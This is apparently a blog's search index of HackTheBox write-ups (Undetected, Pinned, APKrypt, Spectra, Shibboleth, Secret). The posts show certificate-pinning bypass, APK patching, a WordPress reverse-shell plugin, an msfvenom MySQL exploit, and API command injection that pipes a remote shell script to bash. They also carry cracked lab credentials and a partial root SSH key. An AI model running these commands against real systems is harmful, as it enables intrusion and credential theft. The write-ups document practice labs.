&quot;d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0 ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk&quot; | base64 -dwget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `datbase64: invalid inputIt seems that the attacker has replaced the sshd file in /usr/sbin. WE can also download this file an analyze it in ghidra:If we take a look at the auth_password function it seems that there is a variable named backdoor.We can see what bytes are contained in the backdoor variable. WE acn also see that each of these bytes are XORed with 0x96, before being compared with the password variable. We can decode the bakcdoor with cyberchef:We can then login as root with this password:┌──(bitis㉿workstation)-[~/htb/Machines/undetected]└─$ ssh root@djewelry.htb root@djewelry.htb&#39;s password: Last login: Sun Feb 20 15:29:35 2022root@production:~# cat root.txt 8aa6c3df270f6cf60f1126e8d3ec3036root@production:~# Rooted!" }, { "title": "Pinned writeup", "url": "/posts/Pinned/", "categories": "Writeup, HackTheBox, Challenge", "tags": "challenge, android, adb, apk", "date": "2022-07-13 15:00:00 +0200", "snippet": "DescriptionThis app has stored my credentials and I can only login automatically. I tried to intercept the login request and restore my password, but this seems to be a secure connection. Can you help bypass this security restriction and intercept the password in plaintext?Setup and flagI used genymotion to emulate an android device.Install necessary tools with the commandspip install Fridapip install objectionpip install frida-toolsConnect to the emulater via adb, this can be done with the commands adb devices and adb connect IP:PORTcheck architechture with the command:┌──(bitis㉿workstation)-[~/htb/challenges/android/pinned]└─$ adb shell getprop ro.product.cpu.abix86Download the corresponding frida server from this link, and then push it to the device with the following command:adb push frida-server-15.1.28-android-x86 /data/local/tmpand then give permissions to the server with the commandadb shell chmod 777 /data/local/tmp/frida-server-15.1.28-android-x86Get the burpsuite certificate by visiting http://burpsuite/ in a browser where the burpsuite proxy is active. The certificate is then pushed to the device with the following command:adb push cacert.der /data/local/tmp/cert-der.crtThe reason for the specific name is that the injection script is looking for a file with that specific name. We also need to ensure that burpsuite is ready to intercept the traffic coming from the android device, and that the android is routing its’ traffic through the proxy. This is done by entering wifi options on the emulater, checking manual proxy configuration and then entering the IP of the device hosting the emulater and the port that burpsuite is listening on. I also set it to listen on a specific port as well as all interfaces.The script is then pushed to the device and run with the following commands:adb push C:\\ADB\\fridascript.js /data/local/tmpadb shell /data/local/tmp/frida-server &amp;amp;Once the server is running we can list all running processes with frida-ps -U.I then injected the script with the command frida -U -p 2599 -l fridascript.js --no-paus┌──(bitis㉿workstation)-[~/htb/challenges/android/pinned]└─$ adb shell /data/local/tmp/frida-server-15.1.28-android-x86 &amp;amp;[1] 4360 ┌──(bitis㉿workstation)-[~/htb/challenges/android/pinned]└─$ frida -U -p 2112 -l fridascript.js --no-paus 1 ⚙ ____ / _ | Frida 15.1.28 - A world-class dynamic instrumentation toolkit | (_| | &amp;gt; _ | Commands: /_/ |_| help -&amp;gt; Displays the help system . . . . object? -&amp;gt; Display information about &#39;object&#39; . . . . exit/quit -&amp;gt; Exit . . . . . . . . More info at https://frida.re/docs/home/ . . . . . . . . Connected to Google Pixel 3 (id=192.168.57.103:5555)Attaching... [.] Cert Pinning Bypass/Re-Pinning[+] Loading our CA...[o] Our CA Info: CN=PortSwigger CA, OU=PortSwigger CA, O=PortSwigger, L=PortSwigger, ST=PortSwigger, C=PortSwigger[+] Creating a KeyStore for our CA...[+] Creating a TrustManager that trusts the CA in our KeyStore...[+] Our TrustManager is ready...[+] Hijacking SSLContext methods now...[-] Waiting for the app to invoke SSLContext.init()...[Google Pixel 3::PID::2112 ]-&amp;gt;We can then view the traffic in burpsuite:" }, { "title": "APKrypt writeup", "url": "/posts/APKrypt/", "categories": "Writeup, HackTheBox, Challenge", "tags": "challenge, android, apk", "date": "2022-07-13 15:00:00 +0200", "snippet": "DescriptionCan you get the ticket without the VIP code?WriteupWe receive an apk file, which we can then decompile via codium and the APKLab extension. The MainActivity.java file is seen below:package com.example.apkrypt;import android.app.Activity;import android.os.Bundle;import android.util.Base64;import android.view.View;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import java.security.Key;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;import javax.crypto.Cipher;import javax.crypto.spec.SecretKeySpec;/* loaded from: classes.dex */public class MainActivity extends Activity { Button b1; EditText ed1; @Override // android.app.Activity protected void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_main); this.b1 = (Button) findViewById(R.id.button); this.ed1 = (EditText) findViewById(R.id.editTextVipCode); this.b1.setOnClickListener(new View.OnClickListener() { // from class: com.example.apkrypt.MainActivity.1 @Override // android.view.View.OnClickListener public void onClick(View view) { try { if (MainActivity.md5(MainActivity.this.ed1.getText().toString()).equals(&quot;735c3628699822c4c1c09219f317a8e9&quot;)) { Toast.makeText(MainActivity.this.getApplicationContext(), MainActivity.decrypt(&quot;k+RLD5J86JRYnluaZLF3Zs/yJrVdVfGo1CQy5k0+tCZDJZTozBWPn2lExQYDHH1l&quot;), 1).show(); } else { Toast.makeText(MainActivity.this.getApplicationContext(), &quot;Wrong VIP code!&quot;, 0).show(); } } catch (Exception e) { e.printStackTrace(); } } }); } public static String md5(String str) { try { MessageDigest instance = MessageDigest.getInstance(&quot;MD5&quot;); instance.update(str.getBytes()); byte[] digest = instance.digest(); StringBuffer stringBuffer = new StringBuffer(); for (byte b : digest) { stringBuffer.append(Integer.toHexString(b &amp;amp; 255)); } return stringBuffer.toString(); } catch (NoSuchAlgorithmException e) { e.printStackTrace(); return &quot;&quot;; } } public static String encrypt(String str) throws Exception { Key generateKey = generateKey(); Cipher instance = Cipher.getInstance(&quot;AES&quot;); instance.init(1, generateKey); return Base64.encodeToString(instance.doFinal(str.getBytes(&quot;utf-8&quot;)), 0); } public static String decrypt(String str) throws Exception { Key generateKey = generateKey(); Cipher instance = Cipher.getInstance(&quot;AES&quot;); instance.init(2, generateKey); return new String(instance.doFinal(Base64.decode(str, 0)), &quot;utf-8&quot;); } private static Key generateKey() throws Exception { return new SecretKeySpec(&quot;Dgu8Trf6Ge4Ki9Lb&quot;.getBytes(), &quot;AES&quot;); }}This file hashes our input, checks that the hash matches a hardcoded hash, and then decrypts the flag. to get around this check we can patch the apkTo patch the apk we can go into the smali files, which include the lines const-string v0, &quot;5d41402abc4b2a76b9719d911017c592&quot; invoke-virtual {p1, v0}, Ljava/lang/String;-&amp;gt;equals(Ljava/lang/Object;)Z move-result p1 if-eqz p1, :cond_0 .line 37 iget-object p1, p0, Lcom/example/apkrypt/MainActivity$1;-&amp;gt;this$0:Lcom/example/apkrypt/MainActivity; invoke-virtual {p1}, Lcom/example/apkrypt/MainActivity;-&amp;gt;getApplicationContext()Landroid/content/Context; move-result-object p1 const-string v0, &quot;k+RLD5J86JRYnluaZLF3Zs/yJrVdVfGo1CQy5k0+tCZDJZTozBWPn2lExQYDHH1l&quot; invoke-static {v0}, Lcom/example/apkrypt/MainActivity;-&amp;gt;decrypt(Ljava/lang/String;)Ljava/lang/String;The strings included in the smali file is what the apk is going to check against when it is running. We can therefore simply change the md5 hash into something that we know is hashed into that value, for example:┌──(bitis㉿workstation)-[~/Coding/BitisG.github.io]└─$ echo -n &quot;hello&quot; | md5sum5d41402abc4b2a76b9719d911017c592 -We can then use APKLab in VScodium to recompile the apk, and when we enter the string hello as our vip code we get the flag as a Toast!" }, { "title": "Spectra writeup", "url": "/posts/Spectra/", "categories": "Writeup, HackTheBox", "tags": "Easy-box, wordpress, initctl", "date": "2022-07-11 15:00:00 +0200", "snippet": "SummaryThis was an easy box that focused on enumerating a wordpress site, getting access as admin and then installing a malicious php plugin that gave a reverse shell. Once in on the box, a password for another user could be found which had sudo rights to run initctl. This could be exploited by changing the config file into running arbitrary commands.FootholdWe start out by checking out the site:If we go to the issue tracker we are greeted with a wordpress website.We can also go into the testing directory, which has directory listing enabled.If we view the source code for the wp-config.php.save file, we get some credentials.We can then login with the credentials administrator:devteam01As the administrator of the wordpress site we can upload a zip file which contains a malicious plugin. I just used a standard php-reverse shell, zipped it and then uploaded it on to the wordpress site.That sead it is important that the plugin contains the headers/*Plugin Name: WordPress Maintanance PluginPlugin URI: wordpress.orgDescription: WordPress Maintenance ActivitiesAuthor: WordPressVersion: 1.0Author URI: wordpress.org*/At the top of the script otherwise it will not unzip and install the plugin. The actual content of the header can of course be changed as long as the fields are kept the same. We can then go to the plugin menu and activate our plugin, getting a reverse shell.──(bitis㉿workstation)-[~]└─$ nc -lvnp 1337listening on [any] 1337 ...connect to [10.10.14.72] from (UNKNOWN) [10.129.76.40] 34568Linux spectra 5.4.66+ #1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 Intel(R) Xeon(R) Gold 5218 CPU @ 2.30GHz GenuineIntel GNU/Linux 13:41:13 up 20 min, 0 users, load average: 0.14, 0.06, 0.07USER TTY LOGIN@ IDLE JCPU PCPU WHATuid=20155(nginx) gid=20156(nginx) groups=20156(nginx)$ PivotAs the nginx user, we find an interesting file labelled /etc/autologin/passwd with the contents of SummerHereWeCome!!. We try this password on the users on the machine, until we successfully login as katie.Privilege escalationKatie has sudo rights to /sbin/initctl. We can edit the config file found under /etc/init/test.conf so that arbitrary commands are being run as root.katie@spectra /etc/init $ cat test.conf description &quot;Test node.js server&quot;author &quot;katie&quot;start on tmptaskexec cat /root/root.txt &amp;gt; /tmp/outputkatie@spectra /etc/init $ sudo /sbin/initctl emit tmpkatie@spectra /etc/init $ cat /tmp/output d44519713b889d5e1f9e536d0c6df2fcRooted!" }, { "title": "Shibboleth writeup", "url": "/posts/Shibboleth/", "categories": "Writeup, HackTheBox", "tags": "medium-box, zabbix, mysql", "date": "2022-07-09 15:00:00 +0200", "snippet": "SummaryThis box focused on enumerating an udp port hosting an ipmi service for a hash which, when cracked could be leveraged into logging in to a zabbix service. Rooting the box was relatively straight forward given the mysql version, which could be used to run a msfvenom payload giving us a reverse shell on the box.FootholdWe start out by doing an nmap port scan:Nmap scan report for 10.129.98.93Host is up (0.024s latency).Not shown: 999 closed portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.41|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://shibboleth.htb/Service Info: Host: shibboleth.htbService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 11.05 secondsPretty sparse nmap scan, only port open is 80 so lets check it out.There doesn’t really seem to be anything interesting on this service, so let’s try to enumerate some more:==============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://shibboleth.htb[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dns-top1Million.txt[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2021/11/14 07:52:42 Starting gobuster in VHOST enumeration mode===============================================================Found: monitor.shibboleth.htb (Status: 200) [Size: 3686]Found: monitoring.shibboleth.htb (Status: 200) [Size: 3686]Found: zabbix.shibboleth.htb (Status: 200) [Size: 3686] ===============================================================2021/11/14 08:06:17 Finished===============================================================We have located some more vhosts, and after scanning for udp ports we have also found that udp port 623 is open.┌──(bitis㉿workstation)-[~/Coding/BitisG.github.io]└─$ sudo nmap -sU 10.129.77.40 130 ⨯Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-09 22:51 CESTNmap scan report for shibboleth.htb (10.129.77.40)Host is up (0.027s latency).Not shown: 999 closed udp ports (port-unreach)PORT STATE SERVICE623/udp open asf-rmcpNmap done: 1 IP address (1 host up) scanned in 1088.56 secondsWe can try some of the techniques mentioned by hacktricksmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &amp;gt; run[+] 10.129.77.40:623 - IPMI - Hash found: Administrator:17e8f4d6820100002e44e0d663c64e9712ab045d0316ba036117b573ab45edadd1dc693420597a11a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:8adb88e34ccf6233fc1768d3a6c5ee7822473411Cracking the hash we get the following credentials: Administrator:ilovepumkinpie1We can then add the found vhosts to our hosts file and then visit the zabbix site:After logging in we see a dashboardWe can go to Configuration &amp;gt; hosts &amp;gt; item &amp;gt; create item and then create an item with system.run as key. This will run any system commands we give it on the system. If we enter a nc reverse shell and then click test &amp;gt; Get value and test we receive a connection from the target system.┌──(bitis㉿workstation)-[~/htb/Machines/Shibboleth]└─$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.72] from (UNKNOWN) [10.129.76.33] 57796/bin/sh: 0: can&#39;t access tty; job control turned off$ iduid=110(zabbix) gid=118(zabbix) groups=118(zabbix)$ PivotOnce we are logged in as the zabbix user, we notice that two other users are available, one being ipmi-svc and the other being root of course. If we simply use the ipmi password found earlier we can switch to the ipmi user and get the user flag:$ su ipmi-svcPassword: ilovepumkinpie1iduid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc)Privilege escalationTo start with, we first check out the zabbix configuration file found under /etc/zabbix/zabbix_server.conf:---SNIP---### Option: DBUser# Database user.## Mandatory: no# Default:# DBUser=DBUser=zabbix### Option: DBPassword# Database password.# Comment this line if no password is used.## Mandatory: no# Default:DBPassword=bloooarskybluh---SNIP---Also, the version of mysql contains a critical vulnerability which gives us command execution we can use this to get a reverse shell on the system as root.┌──(bitis㉿workstation)-[~/htb/Machines/Shibboleth]└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.72 LPORT=4445 -f elf-so -o CVE-2021-27928.so[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 74 bytesFinal size of elf-so file: 476 bytesSaved as: CVE-2021-27928.soAfter transferring the file to the target system we simply follow the POC as outlined in the previous link from packet storm.ipmi-svc@shibboleth:~$ chmod +x CVE-2021-27928.sochmod +x CVE-2021-27928.soipmi-svc@shibboleth:~$ mysql -u zabbix -pbloooarskybluh -e &#39;SET GLOBAL wsrep_provider=&quot;/home/ipmi-svc/CVE-2021-27928.so&quot;;&#39;&amp;lt;wsrep_provider=&quot;/home/ipmi-svc/CVE-2021-27928.so&quot;;&#39;ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during queryipmi-svc@shibboleth:~$ We then recieve a reverse shell as root:┌──(bitis㉿workstation)-[~/htb/Machines/Shibboleth]└─$ nc -lvnp 4445listening on [any] 4445 ...connect to [10.10.14.72] from (UNKNOWN) [10.129.76.33] 40496iduid=0(root) gid=0(root) groups=0(root)Rooted!" }, { "title": "Secret writeup", "url": "/posts/Secret/", "categories": "Writeup, HackTheBox", "tags": "Easy-box, jwt, git, api", "date": "2022-07-09 15:00:00 +0200", "snippet": "SummaryThis box focused on exploiting an API via command injection after first forging a valid admin JWT. Once a foothold had been established, we could read the root ssh-key via a SUID binary before dumping the memory of the program, allowing us to read the loaded ssh-key from memory.FootholdWe start out by doing an nmap port scan:Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-06 10:21 EDTNmap scan report for 10.129.252.4Host is up (0.081s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)| 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)|_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: DUMB Docs3000/tcp open http Node.js (Express middleware)|_http-title: DUMB DocsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 21.75 seconds3 ports are open, port 22, 80 and 3000. The last two seem to be hosting the same application, since if we attempt to visit them via our browser we see the same documentation pageWe can also download the source to their API on this page. Doing this we can find a file named forgot.js:const router = require(&#39;express&#39;).Router();const verifytoken = require(&#39;./verifytoken&#39;)const User = require(&#39;../model/user&#39;);router.get(&#39;/priv&#39;, verifytoken, (req, res) =&amp;gt; { // res.send(req.user) const userinfo = { name: req.user } const name = userinfo.name.name; if (name == &#39;theadmin&#39;) { res.json({ role: { role: &quot;you are admin&quot;, desc: &quot;{path to the binary}&quot; } }) } else { res.json({ role: { role: &quot;not enough privilages&quot;, desc: userinfo.name.name } }) }})module.exports = router We can also create our own user via curl:┌──(bitis㉿workstation)-[~/…/Machines/Secret/local-web/routes]└─$ curl -X POST -d &#39;{&quot;name&quot;: &quot;user123&quot;, &quot;email&quot;: &quot;test@test.com&quot;, &quot;password&quot;: &quot;password123&quot;}&#39; -H &#39;Content-Type: application/json&#39; http://10.129.77.29:3000/api/user/register{&quot;user&quot;:&quot;user123&quot;} We can then login using the API as well. Doing this we recieve a JWT.┌──(bitis㉿workstation)-[~/…/Machines/Secret/local-web/routes]└─$ curl -X POST -d &#39;{ &quot;email&quot;: &quot;test@test.com&quot;, &quot;password&quot;: &quot;password123&quot;}&#39; -H &#39;Content-Type: application/json&#39; http://10.129.77.29:3000/api/user/login eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmM5ZDllMGRmMjgwZDA0N2FiNmIwNWMiLCJuYW1lIjoidXNlcjEyMyIsImVtYWlsIjoidGVzdEB0ZXN0LmNvbSIsImlhdCI6MTY1NzM5NTc3NH0.PBkFSFO_coZUXV3tPaIXjN9n_XC8N8Kb0T_vohL3uNYWe can then use jwt.io to decode the JWT. It would be extremely cool and very useful if we could just make our own valid tokens, however this requires that we know the secret used to sign the tokens. Luckily, the source code we downloaded earlier is actually is a git repository. We can then use git log and git diff to check for differences between commits. Doing this we find what seems to be the JWT secret:diff --git a/.env b/.envindex fb6f587..31db370 100644--- a/.env+++ b/.env@@ -1,2 +1,2 @@ DB_CONNECT = &#39;mongodb://127.0.0.1:27017/auth-web&#39;-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE+TOKEN_SECRET = secretWe can then create a JWT for a user with the name theadmin. We then see that we have successfully impersonated the admin:┌──(bitis㉿workstation)-[~/htb/Machines/Secret/local-web]└─$ curl -X GET -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmM5ZDllMGRmMjgwZDA0N2FiNmIwNWMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJpYXQiOjE2NTczOTU3NzR9.0l8x-px0y5ok5cvMuj1IC0qzw6p1Oc6J-zfHVlzG16A&#39; http://10.129.77.29:3000/api/priv{&quot;creds&quot;:{&quot;role&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;theadmin&quot;,&quot;desc&quot;:&quot;welcome back admin&quot;}}If we take a look at private.js we find some API functionality that only the admin should have access to:const router = require(&#39;express&#39;).Router();const verifytoken = require(&#39;./verifytoken&#39;)const User = require(&#39;../model/user&#39;);router.get(&#39;/priv&#39;, verifytoken, (req, res) =&amp;gt; { // res.send(req.user) const userinfo = { name: req.user } const name = userinfo.name.name; if (name == &#39;theadmin&#39;){ res.json({ creds:{ role:&quot;admin&quot;, username:&quot;theadmin&quot;, desc : &quot;welcome back admin,&quot; } }) } else{ res.json({ role: { role: &quot;you are normal user&quot;, desc: userinfo.name.name } }) }})router.get(&#39;/logs&#39;, verifytoken, (req, res) =&amp;gt; { const file = req.query.file; const userinfo = { name: req.user } const name = userinfo.name.name; if (name == &#39;theadmin&#39;){ const getLogs = `git log --oneline ${file}`; exec(getLogs, (err , output) =&amp;gt;{ if(err){ res.status(500).send(err); return } res.json(output); }) } else{ res.json({ role: { role: &quot;you are normal user&quot;, desc: userinfo.name.name } }) }})router.use(function (req, res, next) { res.json({ message: { message: &quot;404 page not found&quot;, desc: &quot;page you are looking for is not found. &quot; } })});module.exports = routerIt seems that at the /logs endpoint, the api is executing the command git log --oneline ${file}, however it doesn’t seem to validate the input it takes from the user in any way. We can exploit this by hosting a bash revshell on our system, then giving the API the command to get the revshell and pipe it to bash:curl -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmM5ZDllMGRmMjgwZDA0N2FiNmIwNWMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJpYXQiOjE2NTczOTU3NzR9.0l8x-px0y5ok5cvMuj1IC0qzw6p1Oc6J-zfHVlzG16A&#39; &#39;http://10.129.77.29:3000/api/logs?file=test;curl+http://10.10.14.81:8000/shell.sh+|+bash&#39;This then gives us a revshell on the host system.┌──(bitis㉿workstation)-[~]└─$ nc -lvnp 1234 listening on [any] 1234 ...connect to [10.10.14.81] from (UNKNOWN) [10.129.77.29] 48066bash: cannot set terminal process group (1146): Inappropriate ioctl for devicebash: no job control in this shelldasith@secret:~/local-web$ cd ~cd ~dasith@secret:~$ cat user.txtcat user.txtd90be9c3f2f7248df5a7cfc39b4324b5dasith@secret:~$ Privilege escalationWe start by taking a look at SUID binaries:dasith@secret:~$ find / -perm -4000 2&amp;gt;/dev/nullfind / -perm -4000 2&amp;gt;/dev/null/usr/bin/pkexec/usr/bin/sudo/usr/bin/fusermount/usr/bin/umount/usr/bin/mount/usr/bin/gpasswd/usr/bin/su/usr/bin/passwd/usr/bin/chfn/usr/bin/newgrp/usr/bin/chsh/usr/lib/snapd/snap-confine/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/policykit-1/polkit-agent-helper-1/opt/count/snap/snapd/13640/usr/lib/snapd/snap-confine/snap/snapd/13170/usr/lib/snapd/snap-confine/snap/core20/1169/usr/bin/chfn/snap/core20/1169/usr/bin/chsh/snap/core20/1169/usr/bin/gpasswd---SNIP---The binary located at /opt/count seems out of place, let’s take a look:#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;dirent.h&amp;gt;#include &amp;lt;sys/prctl.h&amp;gt;#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;sys/stat.h&amp;gt;#include &amp;lt;linux/limits.h&amp;gt;void dircount(const char *path, char *summary){ DIR *dir; char fullpath[PATH_MAX]; struct dirent *ent; struct stat fstat; int tot = 0, regular_files = 0, directories = 0, symlinks = 0; if((dir = opendir(path)) == NULL) { printf(&quot;\\nUnable to open directory.\\n&quot;); exit(EXIT_FAILURE); } while ((ent = readdir(dir)) != NULL) { ++tot; strncpy(fullpath, path, PATH_MAX-NAME_MAX-1); strcat(fullpath, &quot;/&quot;); strncat(fullpath, ent-&amp;gt;d_name, strlen(ent-&amp;gt;d_name)); if (!lstat(fullpath, &amp;amp;fstat)) { if(S_ISDIR(fstat.st_mode)) { printf(&quot;d&quot;); ++directories; } else if(S_ISLNK(fstat.st_mode)) { printf(&quot;l&quot;); ++symlinks; } else if(S_ISREG(fstat.st_mode)) { printf(&quot;-&quot;); ++regular_files; } else printf(&quot;?&quot;); printf((fstat.st_mode &amp;amp; S_IRUSR) ? &quot;r&quot; : &quot;-&quot;); printf((fstat.st_mode &amp;amp; S_IWUSR) ? &quot;w&quot; : &quot;-&quot;); printf((fstat.st_mode &amp;amp; S_IXUSR) ? &quot;x&quot; : &quot;-&quot;); printf((fstat.st_mode &amp;amp; S_IRGRP) ? &quot;r&quot; : &quot;-&quot;); printf((fstat.st_mode &amp;amp; S_IWGRP) ? &quot;w&quot; : &quot;-&quot;); printf((fstat.st_mode &amp;amp; S_IXGRP) ? &quot;x&quot; : &quot;-&quot;); printf((fstat.st_mode &amp;amp; S_IROTH) ? &quot;r&quot; : &quot;-&quot;); printf((fstat.st_mode &amp;amp; S_IWOTH) ? &quot;w&quot; : &quot;-&quot;); printf((fstat.st_mode &amp;amp; S_IXOTH) ? &quot;x&quot; : &quot;-&quot;); } else { printf(&quot;??????????&quot;); } printf (&quot;\\t%s\\n&quot;, ent-&amp;gt;d_name); } closedir(dir); snprintf(summary, 4096, &quot;Total entries = %d\\nRegular files = %d\\nDirectories = %d\\nSymbolic links = %d\\n&quot;, tot, regular_files, directories, symlinks); printf(&quot;\\n%s&quot;, summary);}void filecount(const char *path, char *summary){ FILE *file; char ch; int characters, words, lines; file = fopen(path, &quot;r&quot;); if (file == NULL) { printf(&quot;\\nUnable to open file.\\n&quot;); printf(&quot;Please check if file exists and you have read privilege.\\n&quot;); exit(EXIT_FAILURE); } characters = words = lines = 0; while ((ch = fgetc(file)) != EOF) { characters++; if (ch == &#39;\\n&#39; || ch == &#39;\\0&#39;) lines++; if (ch == &#39; &#39; || ch == &#39;\\t&#39; || ch == &#39;\\n&#39; || ch == &#39;\\0&#39;) words++; } if (characters &amp;gt; 0) { words++; lines++; } snprintf(summary, 256, &quot;Total characters = %d\\nTotal words = %d\\nTotal lines = %d\\n&quot;, characters, words, lines); printf(&quot;\\n%s&quot;, summary);}int main(){ char path[100]; int res; struct stat path_s; char summary[4096]; printf(&quot;Enter source file/directory name: &quot;); scanf(&quot;%99s&quot;, path); getchar(); stat(path, &amp;amp;path_s); if(S_ISDIR(path_s.st_mode)) dircount(path, summary); else filecount(path, summary); // drop privs to limit file write setuid(getuid()); // Enable coredump generation prctl(PR_SET_DUMPABLE, 1); printf(&quot;Save results a file? [y/N]: &quot;); res = getchar(); if (res == 121 || res == 89) { printf(&quot;Path: &quot;); scanf(&quot;%99s&quot;, path); FILE *fp = fopen(path, &quot;a&quot;); if (fp != NULL) { fputs(summary, fp); fclose(fp); } else { printf(&quot;Could not open %s for writing\\n&quot;, path); } } return 0;}The code contains the line prctl(PR_SET_DUMPABLE, 1); which as a comment tells us enables coredump generation. The program is used to count characters, words and lines in a specific file. We can use this to count root’s ssh key, crash the program which will then do a coredump. We should then be able to read the ssh key of root in the dump since it will be loaded and in the memory of the program.We open two shells since we need to be pretty fast in crashing the program. We start by running the programdasith@secret:/opt$ ./count Enter source file/directory name: /root/.ssh/id_rsaTotal characters = 2602Total words = 45Total lines = 39Save results a file? [y/N]: yPath: Bus error (core dumped)The contents of the other terminal:dasith@secret:~$ ps -aux | grep countroot 792 0.0 0.1 235664 7516 ? Ssl 19:28 0:00 /usr/lib/accountsservice/accounts-daemonroot 1719 0.0 0.0 2488 592 pts/1 S+ 20:19 0:00 ./countdasith 1721 0.0 0.0 6432 736 pts/0 S+ 20:20 0:00 grep --color=auto countdasith@secret:~$ kill -BUS 1719We actually didn’t have to be that fast since it stopped the execution of the program so we could enter the path of the file we wanted to save our results in. In any case, we then go to /var/crash and unpack the coredump:apport-unpack _opt_count.1000.crash /tmp/crashgoing into the new directory where we unpacked the dump, we can then read the coredump and find the ssh-key of root:-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkUw4nMw/hFlpRPaKRbi3KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+7wNrxitkPrmuViWPGQCotBDCZmn4WNbNT0kcsfA+b4xB+am6tyDthqjfPJngROf0Z26lA1xw0OmoCdyhvQ3azlbkZZ7EWeTtQ/EYcdYofa8/mbQ+amOb9YaqWGiBai69w0Hzf06lB8cx8G+KbGPcN174a666dRwDFmbrd9nc9E2YGn5aUfMkvbaJoqdHRHGCN1rI78J7rPRaTC8aTuBKexPVVXhBO6+e1htuO31rHMTHABt4+6K4wv7YvmXz3Ax4HIScfopVl7futnEaJPfHBdg25yXbi8lafKAGQHLZjD9vsyEi5wqoVOYalTXEXZwOrstp3Y93VKx4kGGBqovBKMtlRaic+YTv0vTW3fis9d7aMqLpuuFMEHxTQPyor3+/aEHiLLAAAFiMxy1SzMctUsAAAAB3NzaC1yc2EAAAGBAJ+sy5Zu0DhhmcrVAjt0jaUeb3Q38Tc5X5FMOJzMP4RZaUT2ikW4tylGbASsoKDr85oc1mHLONd1AyalDFrPqPTsHqtL4sENUCZlcM76hYxTUsc1xFaI5qAnj8Pu8Da8YrZD65rlYljxkAqLQQwmZp+FjWzU9JHLHwPm+MQfmpurcg7Yao3zyZ4ETn9GdupQNccNDpqAncob0N2s5W5GWexFnk7UPxGHHWKH2vP5m0Pmpjm/WGqlhogWouvcNB839OpQfHMfBvimxj3Dde+GuuunUcAxZm63fZ3PRNmBp+WlHzJL22iaKnR0RxgjdayO/Ce6z0WkwvGk7gSnsT1VV4QTuvntYbbjt9axzExwAbePuiuML+2L5l89wMeByEnH6KVZe37rZxGiT3xwXYNucl24vJWnygBkBy2Yw/b7MhIucKqFTmGpU1xF2cDq7Lad2Pd1SseJBhgaqLwSjLZUWonPmE79L01t34rPXe2jKi6brhTBB8U0D8qK9/v2hB4iywAAAAMBAAEAAAGAGkWVDcBX1B8C7eOURXIM6DEUx3t43cw71C1FV08n2D/Z2TXzVDtrL4hdt3srxq5r21yJTXfhd1nSVeZsHPjz5LCA71BCE99744VnRTblCEyhXxOSpWZLA+jed691qJvgZfrQ5iB9yQKd344/+p7K3c5ckZ6MSvyvsrWrEqHcj2ZrEtQ62/ZTowM0Yy6V3EGsR373eyZUT++5su+CpF1A6GYgAPpdEi